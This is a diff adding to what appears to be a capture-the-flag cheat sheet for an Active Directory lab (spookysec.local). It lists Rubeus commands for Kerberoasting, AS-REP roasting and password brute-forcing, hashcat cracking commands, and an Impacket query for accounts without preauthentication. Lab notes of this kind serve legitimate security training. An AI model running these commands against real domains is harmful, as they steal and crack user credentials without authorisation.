@@ -404,6 +404,19 @@ bruteforce passwords with rubeus
 Rubeus.exe brute /password:Password1 /noticket
 ```
 
+kerberoast and crack hash
+```
+Rubeus.exe kerberoast
+hashcat -m 13100 -a 0 hash.txt Pass.txt
+```
+
+asproast and crack hash
+```
+Rubeus.exe asreproast
+# Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
+hashcat -m 18200 hash.txt Pass.txt
+```
+
 Which user account can you query a ticket from with no password?
 ```
 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.4.164
